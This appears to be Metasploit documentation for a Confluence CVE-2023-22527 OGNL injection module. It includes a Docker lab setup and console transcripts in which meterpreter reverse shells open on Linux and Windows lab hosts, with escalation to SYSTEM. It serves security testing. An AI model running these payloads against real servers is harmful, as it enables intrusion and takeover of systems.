## Vulnerable Application
This module exploits an SSTI injection in Atlassian Confluence servers. A specially crafted HTTP request uses the
injection to evaluate an OGNL expression resulting in OS command execution.

Confluence versions up to and including 8.5.3 are vulnerable to this SSTI injection flaw. For more complete information
on affected and fixed versions, see [CONFSERVER-93833][1].

### Setup

1. Create a new `docker-compose.yml` file with the contents below.
2. Startup the container using `docker-compose up`
3. Navigate to the HTTP service running on port 8090
4. Acquire and provide an evaluation license
5. When prompted, setup a standalone / non-clustered system
6. Configure the database settings
    1. Select "By connection string", then Database URL: `jdbc:postgresql://postgresql:5432/confdb`
    2. Username and password are both `confdb`
7. Setup takes a few minutes
8. When prompted, select "Empty Site"
9. Select "Manage users and groups within Confluence"
10. Create an account, it **will not** be needed for exploitation
11. Once setup has completed select "Start" and set a space name to something

#### Docker Compose File

```
version: '3'

services:
  postgresql:
    image: postgres:11
    environment:
      POSTGRES_DB: confdb
      POSTGRES_USER: confdb
      POSTGRES_PASSWORD: confdb
    ports:
      - '5432:5432'

  confluence-server:
    depends_on:
      - postgresql
    image: atlassian/confluence:8.5.3
    ports:
      - '8090:8090'
      - '8091:8091'
```

## Verification Steps

1. Follow the steps from the Setup section to create a test instance
2. Start msfconsole
3. Run: `use exploit/multi/http/atlassian_confluence_rce_cve_2023_22527`
4. Set the `RHOSTS`, `PAYLOAD` and payload-related options
5. Run the module

## Options

## Scenarios

### Confluence 8.5.3 in [Docker]

```
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set RHOSTS 192.168.159.128
RHOSTS => 192.168.159.128
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set TARGET Unix\ Command 
TARGET => Unix Command
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set PAYLOAD cmd/unix/python/meterpreter/reverse_tcp
PAYLOAD => cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set VERBOSE true
VERBOSE => true
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected Confluence version: 8.5.3
[*] Detected target platform: Linux
[+] The target is vulnerable. Successfully tested OGNL injection.
[*] Executing cmd/unix/python/meterpreter/reverse_tcp (Unix Command)
[*] Sending stage (24772 bytes) to 192.168.159.128
[*] Meterpreter session 8 opened (192.168.159.128:4444 -> 192.168.159.128:52920) at 2024-01-24 12:45:59 -0500

meterpreter > getuid
Server username: confluence
meterpreter > sysinfo
Computer        : c38aa4f3b92e
OS              : Linux 6.6.11-200.fc39.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Jan 10 19:25:59 UTC 2024
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > pwd
/var/atlassian/application-data/confluence
meterpreter >
```

### Confluence 8.5.3 on Windows Server 2019

```
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set TARGET Windows\ Command 
TARGET => Windows Command
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set PAYLOAD cmd/windows/powershell/x64/meterpreter/reverse_tcp
PAYLOAD => cmd/windows/powershell/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set LHOST 192.168.159.128
LHOST => 192.168.159.128
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > set VERBOSE true
VERBOSE => true
msf6 exploit(multi/http/atlassian_confluence_rce_cve_2023_22527) > exploit

[*] Powershell command length: 4371
[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Detected Confluence version: 8.5.3
[*] Detected target platform: Windows Server 2019
[+] The target is vulnerable. Successfully tested OGNL injection.
[*] Executing cmd/windows/powershell/x64/meterpreter/reverse_tcp (Windows Command)
[*] Sending stage (200774 bytes) to 192.168.159.10
[*] Meterpreter session 9 opened (192.168.159.128:4444 -> 192.168.159.10:58923) at 2024-01-24 12:47:39 -0500

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > getsystem
...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DC
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MSFLAB
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > pwd
C:\Program Files\Atlassian\Confluence
meterpreter > 
```

[1]: https://jira.atlassian.com/browse/CONFSERVER-93833
